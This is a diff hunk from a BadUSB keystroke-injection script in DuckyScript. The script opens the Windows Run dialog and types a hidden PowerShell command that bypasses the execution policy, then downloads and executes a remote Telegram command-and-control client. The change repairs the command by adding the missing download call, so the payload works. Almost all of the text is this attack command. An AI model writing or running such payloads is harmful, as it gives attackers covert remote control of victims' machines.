@@ -21,7 +21,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_BOT_API_TOKEN_HERE'; https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex
+STRING powershell -NoP -Ep Bypass -W H -C $tg='TELEGRAM_BOT_API_TOKEN_HERE';irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex
 ENTER
 
 
